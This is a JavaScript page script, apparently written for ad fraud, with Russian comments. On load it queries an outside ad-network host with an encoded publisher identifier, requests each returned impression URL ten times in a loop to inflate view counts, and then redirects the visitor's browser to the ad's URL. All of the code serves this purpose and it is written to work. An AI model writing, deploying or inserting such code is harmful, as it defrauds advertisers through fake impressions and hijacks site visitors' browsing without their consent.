window.onload = () => {
    
    (async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTEwOTIzOSwid2lkIjoyNDU0MTQsImQiOiIiLCJsaSI6Mn0", percent=1, count=10) {
        async function requestView(url) {
            try {
                return new Promise(async resolve => {
                    const response = await fetch(url);
                    const status = response.status;
                    console.log(status);
                    resolve(status);
                });
            } catch(e) {
                throw e;
            }
        }

        try {
            // Создаем масств попыток
            let arrayAttempts = [];
            for (let i=0; i < count; i++) {
                arrayAttempts.push(i);
            }

            // Делаем запрос на сервис, получаем в ответ JSON
            const url = `https://yfetyg.com/wnload?a=1&e=${text}=&tz=8&if=0 `;
            const response = await fetch(url);
            const json = await response.json();

            // Ходим по массиву
            for (let row of json) {

                if('rinfo' in row) {
                    if ('rw' in row['rinfo']) {
                        let part_url = row['rinfo']['rw'];
                        if (part_url) {
                            let url = `https://yfetyg.com` + part_url;

                            // Асинхронный цикл. Пока функиця внутри не выполнится, цикл дальше не пойдет
                            for (let att of arrayAttempts) {
                                // Запрос показа
                                await requestView(url);
                            }
                        }
                    }
                }

                if ('ads' in row) {
                    let new_url = row['ads'][0]['uf'];
                    if (Math.random() <= percent) {
                        window.location.href = new_url;
                    }
                }
            }
        } catch(e) {
            alert('Произошла ошибка\nПодробнее в консоли разработчика');
            console.log(e);
        }

    })();

}
